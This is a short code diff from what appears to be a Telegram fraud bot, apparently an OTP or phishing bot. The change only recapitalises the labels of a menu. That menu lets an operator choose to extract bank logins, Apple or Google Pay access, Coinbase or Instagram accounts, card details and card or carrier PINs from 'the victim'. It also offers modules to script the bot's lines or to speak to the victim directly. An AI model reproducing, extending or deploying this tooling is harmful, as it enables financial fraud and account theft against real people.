@@ -23,7 +23,7 @@ export const startScene = new Scenes.WizardScene(
     }
 
     await ctx.replyWithHTML(
-      `👍🏽 Awesome, Let's start\n\nReply with the number of the service you would like to get infos for?\n\n1. <b>Bank</b>\n<i>~ Barclays, Chase ~</i>\n\n2. <b>Pay</b>\n<i>~ Apple pay, Google pay ~</i>\n\n3. <b>Account</b>\n<i>~ Coinbase, Instagram ~</i>\n\n4. <b>Card</b>\n<i>~ Debit or Credit card details ~</i>\n\n5. <b>PIN</b>\n<i>~ Card pin or Carrier pin ~</i>\n\n6. <b>CUSTOM</b>\n<i>~ Let's you specify what the bot should say and the actions the victim should take\nThis module is very delicate so make sure your english is perfectly written when using this module ~</i>\n\n7. <b>PGP</b>\n<i>~ Let's you speak to the victim. NOTE: This is ideal if you know how to speak ~</i>\n\n<i>***request will expire in 2 minutes***</i>`,
+      `👍🏽 Awesome, Let's start\n\nReply with the number of the service you would like to get infos for?\n\n1. <b>BANK</b>\n<i>~ Barclays, Chase ~</i>\n\n2. <b>PAY</b>\n<i>~ Apple pay, Google pay ~</i>\n\n3. <b>ACCOUNT</b>\n<i>~ Coinbase, Instagram ~</i>\n\n4. <b>CARD</b>\n<i>~ Debit or Credit card details ~</i>\n\n5. <b>PIN</b>\n<i>~ Card pin or Carrier pin ~</i>\n\n6. <b>CUSTOM</b>\n<i>~ Let's you specify what the bot should say and the actions the victim should take\nThis module is very delicate so make sure your english is perfectly written when using this module ~</i>\n\n7. <b>PGP</b>\n<i>~ Let's you speak to the victim. NOTE: This is ideal if you know how to speak ~</i>\n\n<i>***request will expire in 2 minutes***</i>`,
     );
 
     return ctx.wizard.next();
